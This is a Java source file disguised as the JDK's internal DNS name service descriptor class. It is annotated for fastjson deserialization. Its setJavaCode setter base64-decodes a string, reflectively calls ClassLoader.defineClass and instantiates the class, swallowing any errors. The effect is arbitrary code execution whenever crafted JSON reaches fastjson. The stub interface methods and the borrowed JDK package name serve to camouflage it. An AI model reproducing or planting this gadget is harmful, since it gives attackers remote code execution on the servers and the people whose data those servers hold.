package sun.net.spi.nameservice.dns;

import com.alibaba.fastjson.annotation.JSONCreator;
import com.alibaba.fastjson.annotation.JSONField;
import com.alibaba.fastjson.annotation.JSONType;
import sun.net.spi.nameservice.NameService;
import sun.net.spi.nameservice.NameServiceDescriptor;
import java.lang.reflect.Method;

@JSONType
public class DNSNameServiceDescriptor implements NameServiceDescriptor {

    public void setJavaCode(String javaCode) {
        try {
            Class clazz = defineCls(javaCode);
            if (clazz != null) {
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }

    public static Class defineCls(String message) {
        try {
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            byte[] clazzByte = base64Decode(message);

            return (Class) defineClass.invoke(
                    Thread.currentThread().getContextClassLoader(), 
                    clazzByte, 0, clazzByte.length
            );
        } catch (Throwable var5) {
            var5.printStackTrace();
        }
        return null;
    }

    public static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    @Override
    public NameService createNameService() { return null; }
    @Override
    public String getType() { return "dns"; }
    @Override
    public String getProviderName() { return "sun"; }
}